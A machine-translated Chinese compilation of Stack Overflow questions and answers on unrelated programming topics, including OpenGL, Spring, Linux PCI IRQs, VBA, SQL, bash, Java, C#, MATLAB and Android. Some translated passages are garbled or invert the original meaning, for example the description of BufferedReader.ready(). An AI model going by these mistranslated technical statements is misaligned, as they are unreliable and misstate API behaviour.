**背景**：我正在开发一个应用程序，它基本上绘制了一个巨大的节点和边的 3D 图。节点被绘制为实例立方体，而边缘则使用几何着色器绘制`GL_LINE`并扩展为由三角形条带组成的 3D 体积“线”。目前，每次重绘边缘时，我都会执行此扩展。但是，由于我的图形是完全静态的（节点不能移动，因此边也不能移动），我认为我只需要将`GL_LINE`定义扩展为三角形条带一次，将扩展的顶点捕获到缓冲区中（使用转换反馈），并且然后从那一点开始，使用那些捕获的顶点和`glMutliDrawArrays`原始类型的`GL_TRIANGLE_STRIP`.

**问题：**我正在绘制的所有这些体积线都包含 10 个顶点。但是，`glMultiDrawArrays`需要一组起始索引和计数大小，它们基本上描述了每个基元的起始点和计数（以元素为单位）。由于我的原语的大小都没有变化，我会制作一个看似不必要的起始索引和计数列表。OpenGL是否提供了任何功能，可以让我简单地指定一个步幅（以元素为单位），在该步幅处会发生原始重启？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T23:00:00.610

没有这样的功能，但根据您的需要，您不需要一个。变换反馈*不能*输出三角带。它仅输出*基本*图元：单个点、线或三角形。这就是为什么[`glBeginTransformFeedback`](http://www.opengl.org/wiki/GLAPI/glBeginTransformFeedback)只需要`GL_POINTS`,`GL_LINES`或`GL_TRIANGLES`.

您所要做的就是一次渲染所有边缘，通过反馈将结果收集到一个缓冲区中，然后通过一次调用来渲染整个事物`glDrawArrays`。

# html - 保值使用 Spring MVC

> ID：15510807
> 
> 赞同：6
> 
> 时间：2013-03-19T21:30:04.343
> 
> 标签：html, spring, spring-mvc, file-upload

我有一个带有两个输入的表单：一个字符串，一个文件。

```
<form:form ...>
  <form:input type="text" ....>
  <form:input type="file" ....>
</form:form> 
```

如果对字符串输入的验证失败，控制器将路由回同一视图。发生这种情况时，字符串字段会被保留，但所选文件会丢失。

有没有办法在重新渲染视图时保留选定的文件？

我*认为*答案是否定的——它是 HTML 文件输入所固有的，而不是服务器端框架。询问是否有我遗漏的东西。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T06:06:28.057

确实无法保留文件输入值。就像它在所有浏览器中实现的一样。据我所知，这与潜在的安全风险有关，但我从未深入。

不过，有可能实现类似的目标。这是我们在项目中所做的：

*   每个带有 fileupload 的表单都有一个 UUID，只要输入无效，该 UUID 就不会改变。
*   在这些编辑阶段，我们使用 FineUploader 异步上传文件，该文件上传到以该 uuid 作为文件夹名称的文件夹
*   我们通过引用当前上传来维护隐藏的输入（文本）
*   如果没有绑定结果错误，我们会在一个方法中处理文件，并在完成时删除上传文件夹
*   如果出现错误，我们会保留 uuid 并维护输入字段，这样我们就不会丢失引用。

这现在工作稳定，作为一个很好的副作用，控制器在某种程度上更容易，在我看来也更干净，因为我们不再需要这些表单的 multipart 并且另一个控制器只处理上传。

编辑：-您可能想要实施一个 cronjob 来清除放弃的上传！

# symfony - 在 Bundle 初始化期间访问 Doctrine

> ID：15510809
> 
> 赞同：0
> 
> 时间：2013-03-19T21:30:19.477
> 
> 标签：symfony, doctrine-orm, symfony-2.2

我有一个 Symfony2 包，我想使用存储键值配置参数的数据库表。我希望能够加载查询并将其缓存很长时间，并能够将配置参数注入 symfony2 服务容器。

现在我正在注入一个服务，它从学说中加载配置，并调用一个 get($key) 方法来检索我想要的键的值。

我基本上希望这些配置选项可以从 symfony2 服务容器参数包中获得。

是否有我可以绑定的事件或某种编译器通过我可以与我的包一起使用来实现这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T09:31:19.500

我会在你的服务监听器中做类似的事情

```
public function onLateKernelRequest(GetResponseEvent $event)
{
    $request = $event->getRequest();
    $mydata= $this->manager->getRepository('YourBundle:YourTable')->getAll();

    $parameters['mydata'] = $mydata;
    $request->attributes->add($parameters);

} 
```

在您的控制器中，您可以获取您的参数：

```
$this->container->get('request')->attributes->get('mydata'); 
```

# linux-kernel - Linux PCI 设备驱动程序 - 总线与内核 IRQ

> ID：15510810
> 
> 赞同：7
> 
> 时间：2013-03-19T21:30:21.303
> 
> 标签：linux-kernel, interrupt, pci, irq

我正在为 Linux 中的 PCIe 卡编写设备驱动程序。我正在尝试在我的驱动程序中使用中断。

读取 PCI 配置寄存器（偏移量 0x3C）的“IRQ Line”部分会报告为设备分配的 IRQ 线是**11**。`lspci -b -vv`还报告说我的设备的中断号是**11**。

这是它变得奇怪`cat /sys/bus/pci/devices/<my_device>/irq`的地方......报告中断号是**19**。`lspci -vv`还报告中断号是19。

在我的驱动程序中请求**11**不起作用。如果我在驱动程序中请求**19**，我可以很好地捕获中断。

是什么赋予了？

谢谢！！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T23:58:33.187

我相信这与“物理”和“虚拟”IRQ 线路之间的差异有关。由于处理器的物理 IRQ 线路数量有限，它分配虚拟 IRQ 线路以允许 PCI 设备的总数超过物理线路的数量。

在这种情况下，19 是您的虚拟 IRQ 线路（由处理器识别），而 11 是物理线路（由 PCI 设备识别）。

顺便说一句，您可能真的应该从该设备的 struct pci_dev 中获取 IRQ 编号，因为它们是动态生成的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-05-11T08:01:58.093

肖恩的回答很容易理解。不过在这里我会尽量让它更完整。

CPU 的 IRQ 引脚几乎总是不直接连接到外围设备，而是通过可编程中断控制器（PIC，例如 Intel 8259A）。这有助于处理大型设备扇出和异构中断格式（基于引脚与基于消息的 PCIe）。

如果您运行最新版本的 lspci，它将打印如下信息

```
Interrupt: pin A routed to IRQ 26 
```

这里，`pin A`作为 OP 中的 11，是物理引脚。这是由 PCI 设备保存并由硬件用于在中断控制器之间进行交换的东西。自民党：

> PCI 设置代码将中断控制器的引脚号写入每个设备的 PCI 配置头中。它使用其对 PCI 中断路由拓扑的了解以及设备 PCI 插槽号和它正在使用的 PCI 中断引脚来确定中断引脚（或 IRQ）编号。设备使用的中断引脚是固定的，并保存在该设备的 PCI 配置头中的一个字段中。它将此信息写入为此目的而保留的中断线字段。当设备驱动程序运行时，它会读取此信息并使用它向 Linux 内核请求对中断的控制。

`IRQ 26`因为 OP 中的 19 是内核代码和 CPU 处理的东西。根据 Linux 文档/IRQ.txt：

> IRQ 编号是用于讨论硬件中断源的内核标识符。通常这是全局 irq_desc 数组的索引，但除了 linux/interrupt.h 实现的内容之外，细节是特定于体系结构的。

所以PCI首先接收到来自设备的中断，将中断源翻译成一个IRQ号并通知CPU。CPU 使用 IRQ 号查看中断描述符表 (IDT) 并找到正确的软件处理程序。

参考：

[http://www.tldp.org/LDP/tlk/dd/interrupts.html](http://www.tldp.org/LDP/tlk/dd/interrupts.html) [http://www.brokenthorn.com/Resources/OSDevPic.html](http://www.brokenthorn.com/Resources/OSDevPic.html)

# excel - 如何在 Excel VBA 中找到以“net”结尾的单元格值并删除行

> ID：15510811
> 
> 赞同：0
> 
> 时间：2013-03-19T21:30:26.170
> 
> 标签：excel, vba

我有这个程序正在寻找 Col D 中值以“net”结尾的任何单元格，然后它将删除整个行/行。但它不会删除值以“net”结尾的所有行。我没主意了。

```
Sub DeleteRows_net()
Application.ScreenUpdating = False
Dim rng As Range

For Each rng In Range("D4:D2700")

If InStr(1, rng.Value, "net") > 0 Then
rng.EntireRow.Delete
End If

Next rng

End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:57:42.853

这是一个很常见的错误......当你循环删除时，你必须从最后一个元素开始，指向第一个元素。将循环更改为：

```
Dim i%
For i=2700 to 4 Step -1
    If InStr(1, Cells(i, "D").Value, "net") > 0 Then
        Cells(i, "D").EntireRow.Delete
    End If
Next i 
```

顺便说一句...不要忘记`Application.ScreenUpdating = True`在程序结束前放置某个地方！

# php - 此查询迭代是否可能

> ID：15510812
> 
> 赞同：0
> 
> 时间：2013-03-19T21:30:26.547
> 
> 标签：php, mysql, database

我有下表运行

```
--TYPE-- --VALUE--  --PLACE--
 type1      10        place1
 type2      20        place1
 type3      30        place1
 type1      40        place2
 type1      40        place2
 type2      60        place2
 type2      60        place2
 type3      70        place2
 type3      70        place2 
```

我需要以以下格式输出所有这些数据。

```
Place1 -> Type1 -> 10
Place1 -> Type3 -> 20
Place1 -> Type3 -> 30
Place2 -> Type1 -> 80
Place2 -> Type3 -> 120
Place2 -> Type3 -> 140 
```

我需要遍历这些地方，但还要总结每种类型的值。可能有许多行包含相同的类型和相同的位置，但值不同，因此需要求和。

我已经绞尽脑汁好几个小时试图思考这是否可能。任何帮助/建议都会有所帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:32:41.020

是的，你可以这么做：

```
SELECT place, type, SUM(VALUE) AS sum FROM table GROUP BY place, type ORDER BY sum ASC 
```

# linux - 我在终端中的错误消息闪烁而不是停留，我怎样才能让它停留？

> ID：15510813
> 
> 赞同：0
> 
> 时间：2013-03-19T21:30:27.237
> 
> 标签：linux, bash, terminal, linux-mint

我有一个基本菜单可以完成已经为我设置的任务，我有菜单要显示和功能可以工作，但是，当用户选择选项 4 时，结果只会在终端中闪烁一瞬间，而且如果他们选择了不正确的值，错误消息会闪烁，我需要他们两个都留在原地。有任何想法吗？

```
#!/bin/bash
#
# Script to perform some simple tasks
#
chmod 755 TaskB.sh
while:
do
clear
echo "*********************"
echo "* Tools *"
echo "*********************"
echo "* [1] Install gnome-disk-utility and gparted *"
echo "* [2] Create CET103Demo.txt *"
echo "* [3] Delete CET103Demo.txt *"
echo "* [4] Search BASH *"
echo "* [0] Exit/Stop *"
echo "*********************"
echo -n "Enter your menu choice [0-4]: "
read yourch
case $yourch in
1) sudo apt-get install gparted gnome-disk-utility ;;
2) cat > Desktop/CET103Demo.txt;;
3) rm Desktop/CET103Demo.txt;;
4) grep -H -r "BASH" /home/mintuser/.profile ;;
0) exit 0;;
*) echo "Oooops!!! Please select choice 1,2,3,4 or 0";
echo "Press Enter to continue..."; read ;;
esac
done 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:37:12.643

我有一段时间没有使用 bash 但试试这个：

```
#!/bin/bash
#
# Script to perform some simple tasks
#
chmod 755 TaskB.sh
while:
do
clear
echo "*********************"
echo "* Tools *"
echo "*********************"
echo "* [1] Install gnome-disk-utility and gparted *"
echo "* [2] Create CET103Demo.txt *"
echo "* [3] Delete CET103Demo.txt *"
echo "* [4] Search BASH *"
echo "* [0] Exit/Stop *"
echo "*********************"
echo -n "Enter your menu choice [0-4]: "
read yourch
case $yourch in
1) sudo apt-get install gparted gnome-disk-utility ;;
2) cat > Desktop/CET103Demo.txt;;
3) rm Desktop/CET103Demo.txt;;
4) grep -H -r "BASH" /home/mintuser/.profile ;;
0) exit 0;;
*) echo "Oooops!!! Please select choice 1,2,3,4 or 0" ;;
esac
read -p "Press [Enter] to continue..."
done
read -p "Press [Enter] to exit..." 
```

# php - 从 SimpleXMLElement 对象中获取值

> ID：15510814
> 
> 赞同：1
> 
> 时间：2013-03-19T21:30:31.287
> 
> 标签：php, xml-parsing, simplexml

我写那篇文章是因为我试图解决一个看起来很愚蠢的问题，但不幸的是我做不到。我有一个正在解析的 XML 文件（链接），`simplexml_load_file($link)`如下所示：

```
function getListPoints($countryCode,$nbrPoints)
{

$xml_containt_url = "http://openchargemap.org/api/?output=xml&countrycode=".$countryCode."&maxresults=".$nbrPoints;

$xml_output = simplexml_load_file($xml_containt_url);

return $xml_output;
} 
```

所以当我打印 xml 输出时：

```
$infos_point = getListPoints("US",2);
print($infos_point); 
```

我得到了我想要的一切，它给了我：

```
SimpleXMLElement Object

(

[ChargePoint] => Array

    (

        [0] => SimpleXMLElement Object

            (
                [@attributes] => Array
                    (
                        [ID] => 2381
                        [UUID] => BFE199D5-07D4-4310-86D7-8BCB9092541D
                        [DateLastConfirmed] => 31/08/2010 00:00:00
                        [OperatorID] => 1
                        [OperatorTitle] => (Unknown Operator)
                        [DataProviderID] => 2
                        [NumberOfPoints] => 
                        [DataQualityLevel] => 1
                        [PercentageSimilarity] => 
                    )

                [GeneralComments] => 1 SP Inductive
                [AddressInfo] => SimpleXMLElement Object
                    (
                        [LocationTitle] => Sacramento County Public Garage
                        [AddressLine1] => 725 7th St
                        [AddressLine2] => SimpleXMLElement Object
                            (
                            )

                        [Town] => Sacramento
                        [StateOrProvince] => CA
                        [Postcode] => 95814
                        [Country] => United States
                        [Latitude] => 38.5846
                        [Longitude] => -121.4961
                        [ContactTelephone1] => 916-874-6227
                        [AccessComments] => 24 hours daily; pay lot
                        [RelatedURL] => SimpleXMLElement Object
                            (
                            )

                    ) 
```

当我想获取 SimpleXMLElement 对象的一些值时会出现问题，例如，我想获取 Town 值，所以我按如下方式进行：

```
$Town = $infos_point->ChargePoint[0]->AdressInfo->Town;
print($Town); 
```

它给了我一个空白页。我已经尝试了我在互联网上阅读的所有内容，但仍然没有。也许有人可以告诉我发生了什么？太好了，因为我将能够继续我的项目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:45:54.893

这是你的地址拼写。应该：`$Town = $infos_point->ChargePoint[0]->AddressInfo->Town;`

# mercurial - Mercurial：在没有公共阶段的情况下从远程存储库中提取更改（非发布服务器，“中止：无法重新设置不可变变更集”）

> ID：15510818
> 
> 赞同：3
> 
> 时间：2013-03-19T21:30:52.113
> 
> 标签：mercurial, mercurial-queue, mercurial-extension, mercurial-phases

## 背景

Mercurial 现在有[阶段](https://www.mercurial-scm.org/wiki/Phases)，这是一个很好的机制，可以防止人们改变不应该改变的历史。当一个变更集被推送到远程存储库时，它已经生成`public`并且不再是[`rebased`](https://www.mercurial-scm.org/wiki/RebaseExtension). 如果存储库是公开的并且您不希望其他人更改您的变更集，这通常是一件好事。

但是，如果您有自己的临时存储库`draft`仅与自己共享变更集，则可能会非常烦人。[Mercurial 可以选择将其关闭](https://www.mercurial-scm.org/wiki/Phases#Publishing_Repository)。将此添加到*远程存储库*`.hg/hgrc`的文件中。

 *```
[phases]
publish = False 
```

这将防止推送到远程存储库的变更集从一个`draft`阶段移动到另一个阶段（本地变更集和刚刚推送到远程存储库的变更集。但是，拉下这个变更集仍然会在阶段`public`中拉下它。`public`

## 问题

`draft`我希望在该阶段下拉变更集。我只是想将变更集推送到我的个人服务器，然后在家里将其拉下来。在我拉取它之后，我将在[`rebase`](https://www.mercurial-scm.org/wiki/RebaseExtension)我从我们真正的发布服务器拉下的任何提交之上进行临时提交。

任何避免将拉取的变更集自动移动到的`public`方法都会很棒。这个远程存储库是我自己的完整和完整的草稿服务器。`draft`在尝试不成功后被迫手动将变更集移回原处，这[`rebase`](https://www.mercurial-scm.org/wiki/RebaseExtension)真的开始让人紧张。

## 参考

*   [https://www.mercurial-scm.org/wiki/Phases](https://www.mercurial-scm.org/wiki/Phases)
*   [水银相简介](http://www.logilab.org/blogentry/88203)
*   [我如何告诉（本地）mercurial 服务器未发布？](https://stackoverflow.com/questions/10726360)
*   [推送到审查存储库后，在 rebase 上“abort: can't rebase immutable changeset”](https://stackoverflow.com/questions/9810987)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T10:20:14.977

这似乎是一个错误。您使用的是什么版本的 Mercurial？您是否尝试在[https://bz.mercurial-scm.org](https://bz.mercurial-scm.org)提交错误？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T21:01:44.810

我通过对 Bugzilla 的帮助解决了这个问题。这是[我在那里的最后](https://bz.mercurial-scm.org/show_bug.cgi?id=3863)一篇文章的片段（感谢你让我走上正确的轨道 djc）。

> 看起来我们可以将其归结为用户错误/错误测试用例（当然）。如果要责怪任何人（除了我自己），那可能是 TortoiseHg。我的测试用例包括从两个存储库之一中剥离提交，然后在另一个存储库中更改该提交的阶段并再次推/拉。似乎 TortoiseHg 有时会进入错误的阶段（可能是缓存问题）。当我在发布和非发布之间来回切换服务器时，我仍然可以重现这一点（但不像以前那样一致）。
> 
> 但是，执行命令行拉取似乎每次都能正常工作。我正在使用命令行来检查传出/传入，进行相位更改等，但可能从未将其用于实际拉动。
> 
> 很抱歉浪费大家的时间。我将其解决为无效，不确定是否有人想将其更改为更好的类别。让我知道您是否希望我检查或扩展其他任何内容。

我会编辑任何更新，让我知道是否有人仍然遇到此问题。*

# java - 如何让 BufferedReader.readLine() 不挂起？

> ID：15510820
> 
> 赞同：6
> 
> 时间：2013-03-19T21:30:56.263
> 
> 标签：java, bufferedreader

有没有办法让`BufferedReader.readLine()`不挂？

我正在创建一个服务器：

*   检查客户端是否传递了任何输入。
*   如果不是，它会执行其他代码并最终循环回检查客户端的输入。

如何检查客户端是否在未运行的情况下传递了任何输入`readLine()`？如果我运行`readLine()`，线程将挂起直到输入被传递？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-19T21:30:56.263

您可以使用`BufferedReader.ready()`，如下所示：

```
BufferedReader b = new BufferedReader(); //Initialize your BufferedReader in the way you have been doing before, not like this.

if(b.ready()){
    String input = b.readLine();
} 
```

`ready()``true`如果输入源没有将任何内容放入尚未读取的流中，则将返回。

编辑：只是一个注释，`true`即使只有一个字符存在，ready 也会返回。您可以使用`read()`来检查是否有换行符或回车符，它们将指示行尾。

欲了解更多信息：[http://docs.oracle.com/javase/7/docs/api/java/io/BufferedReader.html#ready()](http://docs.oracle.com/javase/7/docs/api/java/io/BufferedReader.html#ready())

# c# - 重复列表 .Add(T item) 项目

> ID：15510822
> 
> 赞同：1
> 
> 时间：2013-03-19T21:30:58.370
> 
> 标签：c#, list

为什么`aFooList`包含最后一个项目的五个副本，而不是我插入的五个项目？

预期输出：`01234`

实际输出：`44444`

```
using System;
using System.Collections.Generic;

namespace myTestConsole {
    public class foo {
        public int bar;
    }

    class Program {
        static void Main(string[] args) {
            foo aFoo = new foo(); // Make a foo
            List<foo> aFooList = new List<foo>(); // Make a foo list

            for (int i = 0; i<5; i++) { 
                aFoo.bar = i;
                aFooList.Add(aFoo);
            }

            for (int i = 0; i<5; i++) {
                Console.Write(aFooList[i].bar);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:33:28.700

您已添加相同的项目`aFoo`, 5 次。当您修改引用类型对象的内容时，您不会创建新副本，而是修改了同一个对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:32:49.453

```
List<foo> aFooList = new List<foo>(); // Make a foo list

for (int i = 0; i<5; i++) { 
    foo aFoo = new foo(); // Make a foo
    aFoo.bar = i;
    aFooList.Add(aFoo);
} 
```

当它在列表中时，您仍在修改您的 aFoo。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:44:08.160

您的变量 'aFoo' 基本上是指向内存中某个位置的指针。如果不“更新”另一个实例（malloc），您将修改内存中的相同位置并添加相同的指针 5 次。

就程序员而言，“new”关键字在 C# 中完成了函数，就像 malloc 在 C 中所做的那样。它将获得一个新的内存位置并使 aFoo 指向该位置，而不是旧的。

来自 MSDN：

```
The new operator is used to create objects and invoke constructors 
```

[MSDN](http://msdn.microsoft.com/en-us/library/51y09td4%28v=vs.71%29.aspx#vclrfnew_newoperator)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T21:45:12.530

您已向列表中添加了 5 次对同一对象的引用，每次都修改`bar`. 之后添加此行`aFooList.Add(aFoo);`以查看每次添加`foo`到列表时的效果。

```
Console.WriteLine(string.Join("", foos.Select(f => f.bar))); 
```

对于它的价值，它是一个带有 Linq 的单行（间隔很好以提高可读性）。

```
var foos = Enumerable.Range(0, 5)
                     .Select(n => new foo {bar = n})
                     .ToList(); 
```

* * *

完整示例：

```
foo aFoo = new foo(); // Make a foo
List<foo> aFooList = new List<foo>(); // Make a foo list
Console.WriteLine("\nUsing aFooList");
for (int i = 0; i < 5; i++)
{
    aFoo.bar = i;
    aFooList.Add(aFoo);
    Console.WriteLine(string.Join("", aFooList.Select(f => f.bar)));
}

var foos = Enumerable.Range(0, 5).Select(n => new foo { bar = n }).ToList();
Console.WriteLine("\nUsing foos");
Console.WriteLine(string.Join("", foos.Select(f => f.bar)));

Console.ReadLine(); 
```

输出：

```
使用 FooList
0
11
222
3333
44444

使用 foos
01234

```

# matlab - 在 Matlab 中将数据保存到不同路径中的文件

> ID：15510826
> 
> 赞同：0
> 
> 时间：2013-03-19T21:31:09.093
> 
> 标签：matlab

我正在尝试将 Matlab 中当前工作区的一些数据保存到不同的文件夹中。我尝试使用

```
 save('c:\stp\vtp\train.txt','data','-ASCII'); 
```

其中数据是一个双矩阵。它给了我错误信息

```
??? Error using ==> save
Unable to write file c:\stp\vtp\train.txt: No such file
or directory. 
```

我尝试使用 fullfile 语法，即使这样也是一样的情况。我当前的工作文件夹位于不同的路径中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T22:37:50.893

您可能需要先运行`mkdir`。例如：

```
%Some data to save
x = 1;

%Try to save it in a deep, non-existent directory
save(fullfile(tempdir,'sub1','sub2','sub3','sub4','data.mat'),'x');  
%    This will probably recreate your error

%To fix, first create the directory
mkdir(fullfile(tempdir,'sub1','sub2','sub3','sub4'))
%Now save works
save(fullfile(tempdir,'sub1','sub2','sub3','sub4','data.mat'),'x')  %No error 
```

# javascript - Chrome 扩展 Blob 数据问题

> ID：15510831
> 
> 赞同：1
> 
> 时间：2013-03-19T21:31:28.837
> 
> 标签：javascript, google-chrome-extension, html5-canvas, blob

我正在尝试从 Chrome 扩展中的画布图像创建一个 blob，但是在尝试使用任何方法创建 Blob 时出现错误“ **Uncaught TypeError: object is not a function ”！**

```
var blob = new Blob();
var blob = new Blob(['body { color: red; }'], {type: 'text/css'}); 
```

是两个因上述错误而失败的示例。我实际上正在尝试将 DataURL 转换为 blob，因此我正在使用的代码（也失败）是......

```
function dataURItoBlob(dataURI) {
    'use strict'
    var byteString, 
        mimestring 

    if(dataURI.split(',')[0].indexOf('base64') !== -1 ) {
        byteString = atob(dataURI.split(',')[1])
    } else {
        byteString = decodeURI(dataURI.split(',')[1])
    }

    mimestring = dataURI.split(',')[0].split(':')[1].split(';')[0]

    var content = new Array();
    for (var i = 0; i < byteString.length; i++) {
        content[i] = byteString.charCodeAt(i)
    }

    return new Blob([new Uint8Array(content)], {type: mimestring});
} 
```

我假设 Chrome 不支持新的 blob？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T23:22:29.617

问题是创建 Blob 的调用是从 JS 文件完成的，正确的位置是后台 JavaScript 文件。通过将创建 blob 的方法移动到后台文件中，我可以使用它。

# android - 在 Android 中启动 Activity

> ID：15510836
> 
> 赞同：0
> 
> 时间：2013-03-19T21:32:03.487
> 
> 标签：android, android-layout, android-intent

我是谷歌搜索后的Android新手，我发现如果你想调用另一个活动，你必须使用
`Intent intent = new Intent(getBaseContext(), Activity_Name.class);`
`//if Any Extra`
`//intent.putExtra("", "");`
`intent.putExtra("EmpID", EmpID);`
`startActivity(intent);` `

现在这是一种标准方法，但如果您参考图像。我在 ListView (Activity1) 中重复了近 20 次。 ![工作流程](../Images/93b6cf76693378fc2487f15c91530eee.png)

现在我相信这会不断添加，因为我的应用程序稍后会在没有任何正当理由且不在任何特定位置崩溃时崩溃。

我已**禁用**DataCollection 屏幕上的**后退按钮（活动 2、3、4）**

因此，它是一种纯粹的瀑布方法。任何建议。我应该 `finish();`在最后一个屏幕中添加行吗

`Intent intent = new Intent(getBaseContext(), Activity_Name.class);`
`//if Any Extra`
`//intent.putExtra("", "");`
`intent.putExtra("EmpID", EmpID);`
`startActivity(intent);`
`finish();` `

这样它就死了，回到了前一个，那个死了，回到了前一个。然后登陆ListView。

那会是一个好方法吗。或者有什么我可以像这样调用另一个活动但系统应该忘记所有以前的活动信息的地方。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:39:04.687

如果您不希望用户倒退，请在开始新活动后立即完成当前活动。

后

```
startActivity(intent); 
```

称呼

```
finish(); 
```

如果您想清除活动堆栈，请在进行特定活动时找到您的清单（如“活动 1”）并添加属性`android:clearTaskOnLaunch="true"`

更多信息在这里：http: [//developer.android.com/guide/topics/manifest/activity-element.html#clear](http://developer.android.com/guide/topics/manifest/activity-element.html#clear)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:40:58.560

> 或者有什么我可以像这样调用另一个活动但系统应该忘记所有以前的活动信息的地方

查看 Intent Flags，例如[FLAG_ACTIVITY_CLEAR_TASK](http://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TASK)和[FLAG_ACTIVITY_CLEAR_TOP](http://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TOP)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:46:15.010

您可能最好使用`startActivityForResult`相当`startActivity`。然后，当您调用一个活动时，您知道当它完成时它将返回到调用它的活动（它将进入`onActivityResult`）。通过这种方式，您可以实现：

```
Activty 1 -> Activity 2 -> Activity 1 -> Activity 3 -> Activity 1 etc 
```

或者

```
Activty 1 -> Activity 2 -> Activity 3 -> Activity 2 -> Activty 1 etc 
```

在这两种情况下，您都不能保持活动的“通过”阶段不可见，它们只能接收“您调用的活动”触发器并传递到下一个活动。

# android - Android ListFragment (sherlock) xml 从 url 解析

> ID：15510842
> 
> 赞同：0
> 
> 时间：2013-03-19T21:32:17.963
> 
> 标签：android, xml-parsing, android-listfragment

我对 SherlockListFtagment 和 xml 解析器有疑问。在 ListActivitiy 上使用 AsyncTask 并没有问题。在 ListFragment 上工作我需要编辑什么。

代码：

```
public class AndroidFragment extends SherlockListFragment{

    static final String URL = "http://...";
    // XML node keys
    static final String KEY_ITEM = "novost"; // parent node
    //static final String KEY_ID = "id";
    static final String KEY_NAME = "naslov";
    static final String KEY_COST = "datum";
    static final String KEY_DESC = "text";
    static final String KEY_LINK = "link";
    static final String KEY_LINK1 = "doc";
    ArrayList<HashMap<String, String>> menuItems;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {

                View view =inflater.inflate(R.layout.activity_main, null);
        Log.w("Aplikacija_view","Startovana" );
        return view;

    }
    @Override
    public void onResume() {
        Log.w("Aplikacija_resume","Startovana" );
        new loadListView().execute();

    }

    public class loadListView extends AsyncTask<Integer, String, String> 
    {
        @Override protected void onPreExecute() 
        { 

            Toast.makeText(getActivity(), "Ucitavanje...", Toast.LENGTH_LONG).show();

        super.onPreExecute();
        } 
        @Override protected String doInBackground(Integer... args) 
        { // updating UI from Background Thread 
        menuItems = new ArrayList<HashMap<String, String>>();
            final XMLParser parser = new XMLParser();
            String xml = parser.getXmlFromUrl(URL); // getting XML
            Document doc = parser.getDomElement(xml); // getting DOM element

            NodeList nl = doc.getElementsByTagName(KEY_ITEM);
            // looping through all item nodes <item>
            for (int i = 0; i < nl.getLength(); i++) {
                // creating new HashMap
                HashMap<String, String> map = new HashMap<String, String>();
                Element e = (Element) nl.item(i);
                // adding each child node to HashMap key => value

                map.put(KEY_NAME, parser.getValue(e, KEY_NAME));
                map.put(KEY_COST, "Datum: " + parser.getValue(e, KEY_COST));
                map.put(KEY_DESC, parser.getValue(e, KEY_DESC));
                map.put(KEY_LINK, parser.getValue(e, KEY_LINK));
                map.put(KEY_LINK1, parser.getValue(e, KEY_LINK1));

                // adding HashList to ArrayList
                menuItems.add(map);

            }

        return null; 
        } 
        @Override protected void onPostExecute(String args)
        { 
            Toast.makeText(getActivity(), "Ucitano", Toast.LENGTH_LONG).show();
            String[] from = { KEY_NAME, KEY_DESC, KEY_COST,KEY_LINK,KEY_LINK1};

            /** Ids of views in listview_layout */
            int[] to = { R.id.naslov, R.id.novost, R.id.datum,R.id.link,R.id.link1};

            // Instantiating an adapter to store each items
            // R.layout.listview_layout defines the layout of each item
            SimpleAdapter adapter = new SimpleAdapter(getActivity().getBaseContext(), menuItems, R.layout.listview_layout, from, to);        

            // Setting the adapter to the listView
            setListAdapter(adapter);

                } 
                }

} 
```

应用程序总是失败的。我需要编辑什么？

****** *** *******更新日志****** ** *** ** *** ** *** ** *******

 **```
03-19 23:44:40.203: W/Aplikacija_view(30386): Startovana
03-19 23:44:40.233: W/Aplikacija_resume(30386): Startovana
03-19 23:44:40.243: W/asset(30386): deep redirect failure from 0x01030046 => 0x0a07000c, defStyleAttr=0x01010084, defStyleRes=0x0103008f, style=0x00000000
03-19 23:44:40.243: W/asset(30386): deep redirect failure from 0x01030046 => 0x0a07000c, defStyleAttr=0x01010084, defStyleRes=0x0103008f, style=0x00000000
03-19 23:44:40.413: D/AndroidRuntime(30386): Shutting down VM
03-19 23:44:40.413: W/dalvikvm(30386): threadid=1: thread exiting with uncaught exception (group=0x4200fa08)
03-19 23:44:40.423: E/AndroidRuntime(30386): FATAL EXCEPTION: main
03-19 23:44:40.423: E/AndroidRuntime(30386): java.lang.RuntimeException: Unable to resume activity {in.wptrafficanalyzer.actionbarsherlocknavtabwithimages/in.wptrafficanalyzer.actionbarsherlocknavtabwithimages.MainActivity}: android.support.v4.app.SuperNotCalledException: Fragment AndroidFragment{42678970 #0 id=0x1020002 android} did not call through to super.onResume()
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2875)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread.handleResumeActivity(ActivityThread.java:2904)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2367)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread.access$600(ActivityThread.java:156)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1250)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.os.Handler.dispatchMessage(Handler.java:99)
